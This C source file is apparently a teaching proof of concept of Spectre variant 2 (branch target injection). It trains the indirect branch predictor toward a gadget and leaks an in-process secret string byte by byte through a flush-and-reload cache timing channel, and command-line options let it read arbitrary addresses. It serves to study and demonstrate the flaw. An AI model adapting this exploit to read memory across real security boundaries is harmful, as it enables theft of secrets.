/*
 * 同一个进程中使用spectre v2 进行数据窃去 
 * Spectre Variant 2：branch target injection
 * 
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define CACHE_HIT_THRESHOLD (80)
#define GAP (1024)

uint8_t channel[256 * GAP]; // cache side channel to extract secret phrase



uint64_t *target; // 64bit指针   pointer to indirect call target


char *secret = "NingXiaUniversity@xgy";



//间接跳转的目的地址 spectre gadget
int gadget(char *addr)
{
  return channel[*addr * GAP]; //访问该数组 ，将其带到cache 侧信道中
}



// safe target of indirect call
int safe_target()
{
  return 42;
}



// victim function
// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
  int junk =  0;
  // set up branch history buffer (bhb) by performing >29 taken branches
  // junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }//毒害间接预测分支

  int result;
  // call *target
//汇编指令序列
//输出操作数
//输入操作数
//破坏列表
//寄存器内容前面加*表示间接寻址，以%1寄存器中的数值所指向的地址
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  
  //将eax的值传递到result中
  return result & junk;
}//Victim function


void readByte(char *addr_to_read, char result[2], int score[2])
{
  int hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;
  char dummyChar = '$';

  //初始化操作
  for (i = 0; i < 256; i++) {
    hits[i] = 0;//初始化记录数组
    channel[i * GAP] = 1;//初始化侧信道测量数组
  }

//循环1000次取结果数最大的结果作为分析结论
  for (tries = 999; tries > 0; tries--) {
    
    // poison branch target predictor
    *target = (uint64_t)&gadget;//gadget的地址

    _mm_mfence();

    for (j = 50; j > 0; j--)
      junk ^= victim(&dummyChar, 0);
    
    _mm_mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);

    _mm_mfence();

    // change to safe target
    *target = (uint64_t)&safe_target;
    _mm_mfence();

    // flush target to prolong misprediction interval
    _mm_clflush((void*) target);

    _mm_mfence();

    // call victim
    junk ^= victim(addr_to_read, 0);

    _mm_mfence();

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;

      _mm_mfence(); // make sure read completes before we check the timer

      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }//for tries 1000

  hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}



//
// main function
//
int main(int argc, char *argv[])
{
  target = (uint64_t*)malloc(sizeof(uint64_t));

  char result[2];
  int score[2];
  int len = strlen(secret);
  char *addr = secret;

  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&addr));
    sscanf(argv[2], "%d", &len);
  }

  printf("Reading %d bytes starting at %p:\n", len, addr);
  while (--len >= 0) {
    printf("reading %p     ", addr);
    readByte(addr++, result, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "成功" : "失败"));
    printf("0x%02X='%c'\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("\n");

  free(target);
  return 0;
}
